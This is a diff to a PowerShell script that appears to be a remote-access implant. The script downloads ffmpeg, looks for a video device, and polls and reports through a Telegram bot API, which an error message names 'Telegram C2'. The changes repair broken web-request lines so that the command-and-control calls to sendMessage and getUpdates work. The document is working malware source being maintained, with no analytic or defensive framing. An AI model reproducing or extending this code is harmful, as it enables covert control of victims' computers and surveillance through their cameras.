@@ -502,7 +502,7 @@ if (-not (Test-Path -Path $tempFolder)) {
 $ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
 $ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
 if (-not (Test-Path -Path $ffmpegZip)) {
-    iwr -Uri $ffmpegDownload -OutFile $ffmpegZip -Uri $ffmpegDownload -OutFile $ffmpegZip
+    iwr -Uri $ffmpegDownload -OutFile $ffmpegZip
 }
 Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
 $videoDevice = $null
@@ -612,13 +612,13 @@ param($Messagetext,$ChatID)
 $FixedText=CleanString -Stream $Messagetext
 $Mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
 $JsonData=($Mts | ConvertTo-Json)
-irm -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
+irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
 $catcher = $FixedText
 }
 
 Function ReceiveMSG{
 try{
-    $inMessage=irm -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
+    $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
     return $inMessage.result[-1]
     }
 Catch{return "Telegram C2 Failed"}
